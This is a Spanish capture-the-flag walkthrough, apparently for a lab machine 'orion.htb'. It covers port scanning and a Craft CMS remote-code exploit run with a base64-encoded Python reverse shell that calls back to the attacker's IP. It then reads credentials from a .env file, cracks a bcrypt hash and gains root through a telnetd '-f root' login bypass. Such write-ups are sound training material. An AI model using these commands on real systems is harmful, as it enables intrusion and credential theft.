### Nmap

Primero que nada buscamos los puertos abiertos.

```php
❯ sudo nmap -sS -Pn -n -vvv --open --min-rate 5000 10.129.244.146 -oG port

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Ahora observamos las versiones y servicios que corren para cada uno de esos puertos, observamos un dominio orion.htb

```php
❯ nmap -sCV -p22,80 10.129.244.146 -oN target
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-28 23:09 CEST
Nmap scan report for orion.htb (10.129.244.146)
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Orion Telecom
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Lo agregamos a nuestro /etc/hosts

```php
❯ echo '10.129.244.146 orion.htb' | sudo tee -a /etc/hosts
10.129.244.146 orion.htb
```

---

Observamos la web
![Web](/assets/img/posts/orion-htb/1.png)

### Wfuzz

Ejecuté Wfuzz para enumerar rutas en `orion.htb` y encontré endpoints como `/admin`, `/assets`, `/logout` y `/wp-admin`, además de los archivos principales `index.php` e `index.html`.

```php
❯ wfuzz -c -t 200 --hc=404,403 -w /usr/share/wordlists/dirb/common.txt -u 'http://orion.htb/FUZZ'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://orion.htb/FUZZ
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                              
=====================================================================

000000001:   200        385 L    1182 W     12271 Ch    "http://orion.htb/"                                                                                                  
000000286:   302        0 L      0 W        0 Ch        "admin"                                                                                                              
000000499:   301        7 L      12 W       178 Ch      "assets"                                                                                                             
000002020:   200        182 L      624 W       9687 Ch    "index.html"                                                                                                         
000002021:   200        385 L      1182 W     12271 Ch    "index.php"                                                                                                          
000002017:   200        385 L      1182 W     12271 Ch    "index"                                                                                                              
000002362:   302        0 L      0 W        0 Ch        "logout"                                                                                                             
000004485:   418        661 L    1942 W      54215 Ch    "wp-admin"                                                                                                           
```

En admin observamos  que corre craft cms 5.6.16 vamos a buscar vulnerabilidades sobre esta version donde logramos encontrar este POC en github [Exploit](https://github.com/c0gnit00/CVE-2025-32432)
![admin](/assets/img/posts/orion-htb/2.png)

### Acceso Inicial

Ganamos acceso usando el Exploit

```php
python3 exploit.py -u 'http://orion.htb/' -c "python3 -c \"exec(__import__('base64').b64decode('CmltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcwpzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxMC4xMC4xNC4xMTUiLDQ0NDQpKQpvcy5kdXAyKHMuZmlsZW5vKCksMCkKb3MuZHVwMihzLmZpbGVubygpLDEpCm9zLmR1cDIocy5maWxlbm8oKSwyKQpzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkK'))\""
```

![Acceso](/assets/img/posts/orion-htb/3.png)

---

### Enumerando acceso inicial

Encontré el archivo `.env` de Craft CMS, donde aparecen datos de configuración sensibles, incluyendo la **clave de seguridad** y las **credenciales de acceso a la base de datos MySQL**, además de que el CMS está en modo desarrollo (`CRAFT_DEV_MODE=true`).

```php
www-data@orion:~/html/craft$ cat .env
# Read about configuration, here:
# https://craftcms.com/docs/5.x/configure.html

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=dev

# General settings
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

PRIMARY_SITE_URL=http://orion.htb/
www-data@orion:~/html/craft$ 
```

Con las credenciales que encontré en el `.env`, pude conectarme a la base de datos como `root`. Una vez dentro, busqué la tabla de usuarios y encontré la cuenta `admin` con su contraseña almacenada como un hash bcrypt.

```php
www-data@orion:~/html/craft$ mysql -u root -p'SuperSecureCraft123Pass!' -h 127.0.0.1 orion

MariaDB [orion]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| orion              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.001 sec)

MariaDB [orion]> use orion;
Database changed
MariaDB [orion]> SELECT id, username, email, password FROM users;
+----+----------+----------------+--------------------------------------------------------------+
| id | username | email          | password                                                     |
+----+----------+----------------+--------------------------------------------------------------+
|  1 | admin    | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS |
+----+----------+----------------+--------------------------------------------------------------+
1 row in set (0.000 sec)

MariaDB [orion]> 
```

---

### John

Ahora usando John crackeamos el hash y obtenemos una contraseña.

```php
❯ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C at any time for status
darkangel        (?)     
1g 0:00:00:24 DONE (2026-09-28 19:07) 0.04147g/s 28.36p/s 28.36c/s 28.36C/s gloria..010203
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

---

### User Pivoting

Con la contraseña crackeada nos mudamos al usuario adam

```php
www-data@orion:/home$ su adam
Password: 
adam@orion:/home$ cd adam/
adam@orion:~$ ls -l
total 4
-rw-r----- 1 root adam 33 Sep 28 16:13 user.txt
adam@orion:~$ 
```

---

### Escalada de privilegios

Observamos que internamente corre telnet.

```php
adam@orion:/dev/shm$ ss -tulpn
Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process  
udp    UNCONN  0       0              127.0.0.53%lo:53          0.0.0.0:*             
udp    UNCONN  0       0              0.0.0.0:68          0.0.0.0:*             
tcp    LISTEN  0       10             127.0.0.1:23          0.0.0.0:*             
tcp    LISTEN  0       511            0.0.0.0:80          0.0.0.0:*             
tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*             
tcp    LISTEN  0       4096           127.0.0.53%lo:53          0.0.0.0:*             
tcp    LISTEN  0       80             127.0.0.1:3306        0.0.0.0:*             
tcp    LISTEN  0       128            [::]:22             [::]:*             
adam@orion:/dev/shm$ 
```

Una vez dentro como `adam`, comprobé la versión de `telnetd` y vi que es la 2.7. Lo anoté para comprobar si esta versión puede tener alguna vulnerabilidad que me permita escalar privilegios.

```php
adam@orion:~$ telnetd -V 2>&1
telnetd (GNU inetutils) 2.7
Copyright (C) 2025 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation.
There is NO WARRANTY, to the extent permitted by law.

Written by many authors.
adam@orion:~$ 
```

Como ya había identificado una posible vulnerabilidad en `telnetd`, la aproveché para obtener una sesión como `root`. Una vez dentro, comprobé que tenía privilegios de administrador y accedí a `/root/root.txt`, consiguiendo así la flag de root. en este articulo se explica el Buffer que tiene telnet [Telnet](https://www.exploit-db.com/exploits/52556)

```php
adam@orion:~$ USER='-f root' telnet -a 127.0.0.1
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 5.15.0-177-generic (orion) (pts/3)

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

 * Documentation: https://help.ubuntu.com
 * Management: https://landscape.canonical.com
 * Support: https://ubuntu.com/pro
 System information as of Mon Sep 28 10:17:39 PM UTC 2026

 System load: 0.08              Processes:             249
 Usage of /:   90.0% of 5.81GB
 Memory usage: 17%              Swap usage: 0%
 
 => / is using 90.0% of 5.81GB

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.
2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps on Ubuntu 22.04 with:
https://ubuntu.com/esm

The list of available updates is more than a week old.
To update run: sudo apt update

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Sep 28 22:11:30 UTC 2026 from localhost on pts/2
root@orion:~# cat /root/root.txt 
9d1d5dfd2696065a882fdb347e397972
root@orion:~# 
```
